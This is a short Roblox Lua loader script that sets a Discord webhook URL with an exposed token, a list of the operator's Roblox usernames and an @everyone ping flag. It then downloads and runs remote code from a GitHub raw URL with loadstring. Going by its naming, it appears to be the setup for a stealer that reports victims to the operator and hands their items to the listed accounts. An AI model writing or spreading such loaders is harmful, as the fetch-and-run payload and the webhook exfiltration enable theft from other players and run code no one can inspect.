-- Final Loader (with working Discord proxy)

_G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/https://discord.com/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUEVXJkD2wBqG6eFpGLFL2s24FNYiWA"
-- Example: https://webhook.lewisakura.moe/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "yourusernamehere"}
-- Add your Roblox usernames here

_G.PING_POOR = true   -- true = loud @everyone ping | false = quiet

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
